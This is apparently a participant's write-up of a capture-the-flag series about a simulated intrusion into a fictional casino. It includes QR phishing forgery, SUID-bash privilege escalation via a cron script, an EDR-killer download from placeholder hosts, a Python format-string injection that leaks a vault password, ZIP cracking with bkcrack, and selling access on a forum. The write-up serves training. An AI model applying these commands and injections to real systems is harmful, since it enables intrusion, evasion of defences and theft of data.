While researching The Lucky Lion leading in preparation for this attack, you had discovered that the casino uses multi-factor authentication for employees. Specifically, you learned that they use Squishy Security, a budget security solution notorious for a host of backdoors. Employees need to scan a QR code to sign up with the service on their company phones, so perhaps we can phish them to click on our harvester? Given this MFA onboarding email, can you engineer an attack QR code to capitalize on Squishy Security's lackluster control mechanisms?
Validate your QR code here to get your flag!
**Objectives**
•	Crack the MFA QR code's security scheme
•	Submit your own malicious QR code that is the same as the example, except it would redirect to http://wood-chewers.trees instead of the normal casino sign-in. NOTE: if the example QR's text had any special formatting/encryption applied, so should your submitted QR!
**Tools Required**
•	A QR code generator (you can find one on CyberChef, as well as potentially other helpful tools for this challenge!)
**Solution:** 
I had to take hint to solve this challenge
![image](https://github.com/user-attachments/assets/10d6d3c0-139d-4599-bef5-81124207db26)
Using Cyberchef to decode I got the following output:
![image](https://github.com/user-attachments/assets/d5e61647-dc8e-45de-9c32-7304fdb41c7d)
**XVFQZkFVUUBVQwsZc312c3N0eH5zBHBzfXZwaXNxd2NndHB7c3EPDw0KDAQ4QldWWUVUWkZvR0BcDRFRRkRCCB8YVEFTXUJeVRlSVl8=**
Decoding it from base64 doesn’t make sense so we farther investigate
![image](https://github.com/user-attachments/assets/aeaba463-ccb7-4fb7-8869-8b1fd5428a91)
Using the name of the company![image](https://github.com/user-attachments/assets/261b7583-0ed0-4128-8b2c-ef3bb40e6edc)
  comes out as XOR and mfa_secret from the email
![image](https://github.com/user-attachments/assets/1403a660-3ec8-4233-aed0-80e0763c4770)
We get 0719202207 and swapping the key with this we get:
![image](https://github.com/user-attachments/assets/1087d30f-b54c-4726-9654-19934397e470)
XOR with 07192022
![image](https://github.com/user-attachments/assets/66089823-c0fc-48cc-8a89-cee362e312eb)
To generate a new QRcode we reverse the process
1.	XOR
2.	Base64 encode
3.	QRcode generator
![image](https://github.com/user-attachments/assets/f1396b83-450a-45f9-90a7-87cc91575921)
Submit the QR code
![image](https://github.com/user-attachments/assets/68ae6ec4-a912-487a-aef8-d9644bdf28f1)
I learned a lot through this challenge
**FLAG: flag{WI$h_I'd_Squ!sh3d_Th@t_BuG}**
# O4. Use your Captured Creds
**100**
You cast your phishing line and within no time came up with a catch - hook, line, and sinker! Your victim submitted their Lucky Lion username and password to your credential harvester (you had to supress an eyeroll when you saw their password was "Summer24!") - now what?
Let's see what these creds can do for us! You remember seeing a webmail portal for The Lucky Lion, and sure enough, your phished creds get you access to the employee's email account. Time to poke around to see what else we can learn about The Lucky Lion's environment.
You intentionally targeted an employee on The Lucky Lion's information security team with your phish, knowing that they will likely have the most interesting access and information. In particular, you want to know more about The Lucky Lion's security tools so that you can be prepared to bypass them once inside their network. You expect that at a minimum, the Lucky Lion will have an Endpoint Detection and Response tool (EDR) that could give you trouble down the road .
Let's try to determine the EDR tool utilized by The Lucky Lion. We can use our stolen credentials to sign into our victim's webmail account - utilize the link below to access the smished webmail inbox.
**Objectives**
•	Determine the name of the EDR tool utilized by The Lucky Lion.
**Required Tools**
•	Web Browser
**Additional Resources**
•	https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
https://target-httpd.chals.io/webmail/webmail-inbox.html
**Solution:**
I started by checking all the emails in  each folder.
**Inbox:**
![image](https://github.com/user-attachments/assets/9ea8a854-11b8-4c17-adeb-8a00a985624a)
I found some advertisement but nothing rock solid. So I moved to the next folder.
Favorites:
One email caught my eye in Favorites which had the license file
![image](https://github.com/user-attachments/assets/cc8839d6-be37-43e6-bc95-7f97796fb43f)
![image](https://github.com/user-attachments/assets/256f9f81-090d-4941-9e7d-de6402c901cd)
**FLAG: CyberGuardian**

# O6. Find a Way In
**100**
Now that you have some credentials, let's find somewhere to use them!
You fire up Nmap, your trusty network mapper, and configure a scan to identify hosts in The Lucky Lion's IP space that are online and reachable.
You've found one server in particular that looks like a potentially juicy target, but to know for sure whether the host will have something you can sign into with your stolen credentials, you'll need to know what services are open. Use Nmap to scan this server to determine which services specifically are available.
**Objectives**
•	Determine the name of the services running on the server of interest
**Tools Required**
•	Nmap - download here
**Additional Resources**
•	https://www.stationx.net/nmap-cheat-sheet/
0.cloud.chals.io:12557
**Solution:**
I ran the following nmap command to get the full detail on the network running a service on port 12557
sudo nmap -A  -O -sC -Pn -p  12557 0.cloud.chals.io
![image](https://github.com/user-attachments/assets/b8ed24d3-bf7d-4e6c-ae84-b3f879c01820)
**FLAG: ctf{t@rgetL0ck3d}**
# O9.1 Escalate your Privileges
**150**
Things are going well - you've gained initial access to another host on The Lucky Lion's network, but you have limited access with your current privileges. Let's open up a terminal and see if you can change that.
One of the easiest ways to run a command that you don't have permission to execute is to find a file that DOES have the right permissions and have it execute your command for you, all you have to do is find the right file!
Flag Format The file's name in name.extension format (e.g.: example.txt). You don't need to include the path.
**Objectives**
•	Using the NARSH (Not A Real Shell) emulator, find a file with world writable permissions that executes as root.
Tools Required
•	Web Browser
Additional Resources
•	MITRE ATT&CK
•	RED HAT
•	LINUX FOUNDATIONS
https://target-httpd.chals.io/shell/privesc.html
**Solution:**
I started out by looking at all the file in NARSH and noticed there are bunch of scripts
![image](https://github.com/user-attachments/assets/2db5718e-c469-4fef-a66f-8249c1e18d9d)

After going thru all the files I found a cron job
![image](https://github.com/user-attachments/assets/81b406cc-8b52-48b8-aa24-d50c967bc3a5)
With the following script running
![image](https://github.com/user-attachments/assets/87e9e83f-306a-48c5-a2af-f613877fd8d0)
**FLAG: yydUpQ.sh**

# O9.2 Escalate your Privileges
**150**
Ok now you're rockin' - you're one step further to gaining root access to a host on the Lucky Lion network.
Now that you've identified the file with improperly set permissions and the cronjob that executes the file, you were able to modify the file by adding the below command that will be executed as the file owner.
The following command will copy /bin/bash to /tmp and set the user or group ID on execution. This will effectively execute the file as root.
cp /bin/bash /tmp && chmod +s /tmp/bash
But how can you obtain a root shell to successfully elevate your privileges?
Flag Format The exact command that would give you a root shell; include the full path and any arguments/flags for the command.
**Objectives**
•	What command would you execute to get a root shell?
**Tools Required**
•	Web Browser
Additional Resources
•	MITRE ATT&CK
**Solution:**
I started by doing a quick google search and found this:
![image](https://github.com/user-attachments/assets/cc4f72cc-d53e-448f-a083-c64d25c527f3)
**Flag: /tmp/bash -p**
# O7. Bypass the EDR
**300**
You cashed in your creds and now have initial access to a host in The Lucky Lion's internal network - one step closer to payday!! You better make sure you've got more than one way into this environment in case someone kicks you out - perhaps it would be prudent to download and install some remote management software for future use.
That might be easier said than done, though... you expect The Lucky Lion's security tools might give you trouble. Fortunately, another member of The Mound has written an EDR killer ("f4c3st4b") specific to the EDR you identified earlier. The only issue might be getting it on the host.
**Objectives**
•	Download AnyDesk on the victim machine
•	It's not as easy as it sounds!
Flag Format Flag will be wrapped: wicys2024{flag_goes_here} In this example
•	flag_goes_here
•	wicys2024{flag_goes_here}
•	{flag_goes_here}
would all be accepted as valid flags.
Required Tools
•	Web Browser
•	AnyDesk SIMULATED LINK: https://anydesk.com.example/downloads/anydesk.bin
•	"f4c3st4b" EDR Killer SIMULATED LINK: https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
**Additional Resources**
•	https://www.bleepingcomputer.com/news/security/ransomware-gangs-abuse-process-explorer-driver-to-kill-security-software
https://target-httpd.chals.io/shell/edr.html
**Solution**
I ran the following commands to bypass the edr:
user@wicys2024:/$ cd usr/bin
**Saw the following directory:**

user@wicys2024:bin$ ls
cguard  cguardd
**running processes**
user@wicys2024:bin$ ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
**ran the following to download faccestab but ran into issues**
user@wicys2024:bin$ ./cguard https://github.com.example/the-mound/facestab/relea
ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
**Tried to disable the password:**
But it still asked for password
user@wicys2024:bin$ ./cguard --disable
must specify password to disable
**figured out the flag to bypass the password for successful download**
user@wicys2024:bin$ ./cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ downloaded script to /tmp/facestab
**Went to tmp to look for the facestab**
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ cat facestab
invalid piduser@wicys2024:tmp$ ./facestab
user@wicys2024:tmp$ ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
user@wicys2024:tmp$ ./facestab -h
Usage: facestab -p PID [options]  
        -p,     Choose process by PID
        -h,     Print this menu
**Chenged permissions to make facestab executeable**
user@wicys2024:tmp$ ./facestab -p 10
user@wicys2024:tmp$ invalid permissions

user@wicys2024:tmp$ chmod +x facestab
invalid permissions: +x
user@wicys2024:tmp$ chmod + faces facestacestacestab
must specify new permissions and file to apply them to
user@wicys2024:tmp$ ls -a
path does not exist: /tmp/-a
user@wicys2024:tmp$ ls -h
path does not exist: /tmp/-h
user@wicys2024:tmp$ ls -l
-rw-r--r-x      root    root    11      2024-08-03T22:55:42.269Z        facestab
user@wicys2024:tmp$ chmod -h
must specify new permissions and file to apply them to
user@wicys2024:tmp$ chmod +x facestab
invalid permissions: +x
user@wicys2024:tmp$ chmod 777 facestab
permission denied
user@wicys2024:tmp$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ chmod +x tmp
invalid permissions: +x
user@wicys2024:/$ chmod + tm tm tmp
must specify new permissions and file to apply them to
user@wicys2024:/$ chmod 777 tmp
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ ls -l
-rw-r--r-x      root    root    11      2024-08-03T22:55:42.269Z        facestab
user@wicys2024:tmp$ ls -l
-rw-r--r-x      root    root    11      2024-08-03T22:55:42.269Z        facestab
user@wicys2024:tmp$ cd facestab
not a directory: facestab
user@wicys2024:tmp$ ./facestab
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ chmod 676
must specify new permissions and file to apply them to
user@wicys2024:tmp$ chmod 676 facestab
permission denied
**since I was constanlty failing I tried to see which commands can be run on NARSH**
user@wicys2024:tmp$ help
available commands:

help            displays available commands
cat             concatenate file contents
cd              change directory
clear           clear terminal
echo            write arguments to standard output
ls              list directory contents
mkdir           make directories
pwd             print working directory
chmod           change file permissions
curl            get url
ps              process status
user@wicys2024:tmp$ ./facestab -p 10
user@wicys2024:tmp$ invalid permissions

user@wicys2024:tmp$ ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
**After spending some time I decided to run curl command**
user@wicys2024:tmp$ curl -o https://anydesk.com.example/downloads/anydesk.bin
blocked by Cyber Guardian
user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again

user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again

user@wicys2024:tmp$ ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again
./facestab -p 10
user@wicys2024:tmp$ invalid permissions

user@wicys2024:tmp$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ ls -l
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        bin
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        usr
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        var
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        etc
drwxr-x---      root    root    64      2024-08-03T22:54:46.125Z        root
drwxrwxrwx      root    root    64      2024-08-03T22:54:46.125Z        tmp
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        home
user@wicys2024:/$ chmod -R 777 tmp
must specify new permissions and file to apply them to
user@wicys2024:/$ chmod -R 777 usr
must specify new permissions and file to apply them to
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ ls -l
-rw-r--r-x      root    root    11      2024-08-03T22:55:42.269Z        facestab
user@wicys2024:tmp$ chmod 777 ./facestab
permission denied
user@wicys2024:tmp$ ./facestab --p 100
user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again

user@wicys2024:tmp$ ./facestab -p 10
user@wicys2024:tmp$ invalid permissions
cd ..
user@wicys2024:/$ cd ..
user@wicys2024:/$ cd..
narsh: command not found: cd..
user@wicys2024:/$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd ..
user@wicys2024:/$ cd bin
user@wicys2024:bin$ ls
narsh
user@wicys2024:bin$ ls -l
-rwxr-xr-x      root    root    0       2024-08-03T22:54:46.125Z        narsh
user@wicys2024:bin$ chmod 777 narsh
permission denied
user@wicys2024:bin$ ./narsh
narsh: command not found: ./narsh
user@wicys2024:bin$ ls
narsh
user@wicys2024:bin$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again
ls
facestab
user@wicys2024:tmp$ ./facestab -p 100
user@wicys2024:tmp$ try again
ps -A
PID     CMD
10      /usr/bin/cguardd
100     narsh
user@wicys2024:tmp$ cd ..
user@wicys2024:/$ chmod 777 root
permission denied
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd usr
user@wicys2024:usr$ cd bin
user@wicys2024:bin$ ./cguard --script https://anydesk.com.example/downloads/anydesk.bin
user@wicys2024:bin$ try again
./cguard --script curl -o https://anydesk.com.example/downloads/anydesk.bin
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script curl -o https://anydesk.com.example/downlo
ls
cguard  cguardd
user@wicys2024:bin$ ./cguard --script curl -o https://anydesk.com.example/downlo
cd bin
directory not found: bin
user@wicys2024:bin$ cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ cguard --scan
must specify a file/directory to scan
user@wicys2024:bin$ ./cguard --script curl -o https://anydesk.com.example/downlo
cd usr
directory not found: usr
user@wicys2024:bin$ /.cguard --script /tmp/.facestab
narsh: command not found: /.cguard
user@wicys2024:bin$ ./cguard --script /tmp/facestab
user@wicys2024:bin$ try again
./cguard --script /tmp/facestafacestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script /tmp
user@wicys2024:bin$ try again
./cguard --script /tmp./facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script ./facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script ./facestab -p 10
user@wicys2024:bin$ try again

user@wicys2024:bin$ cd ..
user@wicys2024:usr$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ ./cguard --./facesta./facesta./facest./faces./face./fa./face
./f./facestab
narsh: command not found: ./c./facestab
user@wicys2024:tmp$ ./cguard --script ./facestab
narsh: command not found: ./cguard
user@wicys2024:tmp$ cd ../
user@wicys2024:/$ cd bin
user@wicys2024:bin$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd usr
user@wicys2024:usr$ ls
bin
user@wicys2024:usr$ cd bin
user@wicys2024:bin$ ./cguardd -h
narsh: invalid permissions: ./cguardd
user@wicys2024:bin$ ./cguard -help
user@wicys2024:bin$ ./cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ ./cguard --script /tmp/facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script /tmp/./facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ downloaded script to /tmp/facestab
./cguard --script https://github.com.example/the-mound/facestab/releases/downloa

user@wicys2024:bin$ ./cguard -script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ ./cguard - https://github.com.example/the-mound/facestab/rel
./cguard --script https://github.com.example/the-mound/facestab/releases/downloa
./cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ ./cguard --status
on
user@wicys2024:bin$ ./cguard --script /tmp/facestab
user@wicys2024:bin$ try again
./cguard - https://github.com.example/the-mound/facestab/releases/download/v4.2.
./cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ downloaded script to /tmp/facestab

user@wicys2024:bin$ ./cguard --script https://github.com.example/the-mound/faces
./cguard - https://github.com.example/the-mound/facestab/releases/download/v4.2.
./cguard --script https://github.com.example/the-mound/facestab/releases/downloa
./cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ ./cguardd /tmp/./facestab
narsh: invalid permissions: ./cguardd
user@wicys2024:bin$ ./cguard --script -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ ./cguard --script ./facestab
user@wicys2024:bin$ try again
cguard
user@wicys2024:bin$ cguard --script /tmp/facestab
user@wicys2024:bin$ try again
cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ cguard --script /tmp/facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ downloaded script to /tmp/facestab

user@wicys2024:bin$ cguard --script https://github.com.example/the-mound/facesta
cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab
user@wicys2024:bin$ downloaded script to /tmp/facestab

user@wicys2024:bin$ cguard --script ./facestab
user@wicys2024:bin$ try again
cd ..
user@wicys2024:usr$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ cd tmp
user@wicys2024:tmp$ ls
facestab
user@wicys2024:tmp$ cguard --script facestab -p 10
user@wicys2024:tmp$ try again

user@wicys2024:tmp$ cguard --script ./facestab -p 10
user@wicys2024:tmp$ try again

user@wicys2024:tmp$ cguard --status
on
user@wicys2024:tmp$ ./cguard --status
narsh: command not found: ./cguard
user@wicys2024:tmp$ cd ..
user@wicys2024:/$ cd usr
user@wicys2024:usr$ cd bin
user@wicys2024:bin$ ./cguard  --script ./facestab -p 10
user@wicys2024:bin$ try again
./cguard  --script ./facestab
user@wicys2024:bin$ try again

user@wicys2024:bin$ ./cguard  --scrip ./facesta ./facestab
user@wicys2024:bin$ 
user@wicys2024:bin$ ./cguard  -s /facestab
user@wicys2024:bin$ ./cguard --status
on
user@wicys2024:bin$ ls -l
-rwxr-xr-x      root    root    16      2024-08-03T22:54:46.125Z        cguard
-rwxr-x---      root    root    16      2024-08-03T22:54:46.125Z        cguardd
user@wicys2024:bin$ chmod 777 cguard
permission denied
user@wicys2024:bin$ chmod +x cguard
invalid permissions: +x
user@wicys2024:bin$ chmod + cguar cguard
must specify new permissions and file to apply them to
user@wicys2024:bin$ cd ..
user@wicys2024:usr$ cd ..
user@wicys2024:/$ ls
bin     usr     var     etc     root    tmp     home
user@wicys2024:/$ ls -l
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        bin
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        usr
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        var
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        etc
drwxr-x---      root    root    64      2024-08-03T22:54:46.125Z        root
drwxrwxrwx      root    root    64      2024-08-03T22:54:46.125Z        tmp
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        home
user@wicys2024:/$ cd usr
user@wicys2024:usr$ ls -l
drwxr-xr-x      root    root    64      2024-08-03T22:54:46.125Z        bin
user@wicys2024:usr$ cd bin
user@wicys2024:bin$ ls -l
-rwxr-xr-x      root    root    16      2024-08-03T22:54:46.125Z        cguard
-rwxr-x---      root    root    16      2024-08-03T22:54:46.125Z        cguardd
user@wicys2024:bin$ ./cguard
user@wicys2024:bin$ ./cguard -h
usage: cguard [-h] < --status | --script SCRIPT | --disable DISABLE | --scan SCAN >

options:
  -h, --help         show this help message and exit
  --status           Display status
  --script SCRIPT    Download and run helper script
  --disable DISABLE  Disable EDR (requires password)
  --scan SCAN        Run a quick scan on specified directory
user@wicys2024:bin$ ./cguard https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab -p 10
user@wicys2024:bin$ ./cguard https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab -p 10
user@wicys2024:bin$ cguard --status
on
user@wicys2024:bin$ ./cguard https://github.com.example/the-mound/facestab/releases/downlo

**After going through multiple rabbit holes finally figured that I could run the script with -p to stop the process**
user@wicys2024:bin$ ./cguard --script https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab -p 10
user@wicys2024:bin$ downloaded script to /tmp/facestab
successfully killed 10

user@wicys2024:bin$ curl -o https://anydesk.com.example/downloads/anydesk.bin
usage: curl URL
user@wicys2024:bin$ curl -ohttps:https://anydesk.com.example/downloads/anydesk.bin
user@wicys2024:bin$ try again
cgurard --status
narsh: command not found: cgurard
user@wicys2024:bin$ cguard --status
off
user@wicys2024:bin$ curl -h
curl - transfer a URL
        usage: curl URL
**Successfully downloaded the anydesk.bin**
user@wicys2024:bin$ curl https://anydesk.com.example/downloads/anydesk.bin
user@wicys2024:bin$ back to the GUI: wicys2024{anydeskanytime}
 
**FLAG: wicys2024{anydeskanytime}**
# O8. Performing an Exfil of a Filesystem
300
You have a solid foothold in The Lucky Lion's environment - now it's time to start poking around. Looking through more of the emails from the account you compromised, you see something interesting: a backup of a server was recently uploaded to a secure fileshare. You wager there could be some valuable information to sell if you can get those files, but the backup is password protected.
To get you started, we've provided you with the host & port where we've noticed a password vault service running. You can connect to it with Netcat (nc) as shown at the bottom.
Note: the hints worth 50 are about the ZIP!
**Objectives**
•	Find a way to extract passwords from the vault so you can download the ZIP
•	Once you obtain the ZIP, find a way to break the encryption scheme and find the flag file within
**Tools Required**
•	Shell environment with nc (netcat) installed
Additional Resources
•	All about ZIPs
•	ValuVault documentation
nc 0.cloud.chals.io 18529
**Solution:**
This challenge was one of the hardest for me as I was not familiar with how ValuVault works
After using the hint I was finally able to solve this challenge. Using this MOTD script I was able to get the Masterpassword
MOTD {now.__init__.__globals__}
![image](https://github.com/user-attachments/assets/49f4e9c2-db07-43cd-8bf6-6129cdc32ec1)
Using the masterpassword “Li0n_a83*kFYz95!2” 
I was able to access the password for backup file which was shared in the email server
![image](https://github.com/user-attachments/assets/d3998608-d590-43ff-b69f-f4bbcb8f18f2)
8szS)89Y$jDq0t}BS:Hj<37J
![image](https://github.com/user-attachments/assets/ffbb9430-52c4-46d8-a3aa-d8993de94c9b)
![image](https://github.com/user-attachments/assets/ffb47f86-079d-456d-9ca9-180a8bca3014)
Once I open the files I saw the flag.txt but wasn’t able to access it
The other file which seemed familiar was slots.txt.
![image](https://github.com/user-attachments/assets/a335e000-33ad-4e7a-935e-1b62ac2b729d)
I went back to ValueVault and got the password for slots.txt
![image](https://github.com/user-attachments/assets/3e75b9f7-29db-44b9-8f53-5d543499fb11)
 and change the extension of the web address from backup.zip to slot.txt
https://target-flask.chals.io/vault/slots.txt
![image](https://github.com/user-attachments/assets/1fdd0365-3fae-4def-b192-4bd6a59132d4)
I got the following textfile
![image](https://github.com/user-attachments/assets/d24053be-962f-4847-a4c7-d964c8f031f1)
After that I used the following command to 
7z l -slt backup.zip to get more technical info on the file and noticed that the flag.txt has zipcrypto
![image](https://github.com/user-attachments/assets/7bcbfd79-f850-4874-9be2-465088f67e0b)
Running the bkcrack gets me 3 keys
![image](https://github.com/user-attachments/assets/e419bb85-e584-4b8e-9f17-c74360569213)
And we use these 3 keys to get decrypt the zip files
![image](https://github.com/user-attachments/assets/8b042ba9-1230-4eec-8e15-7212a66bf212)
Ta-Da we get the flag
![image](https://github.com/user-attachments/assets/1b477385-c4a2-45a4-992f-fab844e28c9d)
**FLAG: flag{xamine_your_zip_pretty_darn_quick}**
# O10. Sell your Access 
This challenge was designed around a bit of trial and error with feedback built-in in the 
form of responses from existing forum members. 
**Make a post** 
Click the "New Post" button in the top right. 
For topic, you'll want to pick "Buy/Sell Access" since you're selling access. 
For the subject, anything will do as long as it mentions the "Lucky Lion" somewhere. 
In the post body, the only thing the buyer is interested in is your Bitcoin address and Tox ID, 
so make sure you put them in there somewhere. They don't have to be genuine, but they do 
need to match the spec, so the checksums need to match. Here's some examples: 
Bitcoin wallet: 
3JkACdinPRb2qbEYPVZ9BvSXQHYwoE3JRy 
 
Tox ID: 
11C0152AD2FB0C137C9BD6AC07C67AFC44AA7E7842A345C0F54A0412E55A9D26992A
9C50BCE0 

![image](https://github.com/user-attachments/assets/17078245-bc7a-4cc9-83a7-0b0e9a785f33)
![image](https://github.com/user-attachments/assets/13c558d1-c26b-4a64-916f-485b72a21cd1)
![image](https://github.com/user-attachments/assets/616f71a9-858b-4210-99ff-c0a396ab72d5)
**Flag: wicys2024{it's_a_trap}**
